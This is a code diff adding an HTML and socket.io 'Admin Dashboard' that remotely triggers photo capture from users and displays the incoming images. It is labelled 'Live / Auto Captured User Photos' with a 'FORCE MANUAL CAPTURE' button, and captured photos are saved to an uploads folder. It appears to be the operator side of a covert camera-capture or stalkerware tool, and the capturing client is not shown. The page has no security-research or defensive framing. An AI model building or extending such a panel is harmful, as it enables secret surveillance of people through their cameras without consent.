@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Dashboard</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background: #18191a; color: white; }
+        .card { background: #242526; max-width: 500px; margin: auto; padding: 25px; border-radius: 12px; }
+        button { background: #e41e3f; color: white; border: none; padding: 14px 28px; border-radius: 6px; cursor: pointer; font-size: 18px; font-weight: bold; }
+        img { width: 100%; border-radius: 8px; margin-top: 15px; border: 2px solid #3a3b3c; min-height: 250px; background: #000; object-fit: contain; }
+        .info { font-size: 13px; color: #aaa; margin-top: 8px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Admin Dashboard</h2>
+    <p>Live / Auto Captured User Photos</p>
+    
+    <button id="captureBtn">FORCE MANUAL CAPTURE</button>
+    <p class="info">*Photos are automatically saved in `uploads/` folder.</p>
+    
+    <br>
+    <h3>Live Output:</h3>
+    <img id="receivedPhoto" alt="Capture output display">
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    const socket = io();
+    const captureBtn = document.getElementById('captureBtn');
+    const receivedPhoto = document.getElementById('receivedPhoto');
+
+    captureBtn.addEventListener('click', () => {
+        socket.emit('admin-trigger-capture');
+    });
+
+    socket.on('send-photo-to-admin', (imageData) => {
+        receivedPhoto.src = imageData;
+    });
+</script>
+</body>
+</html>
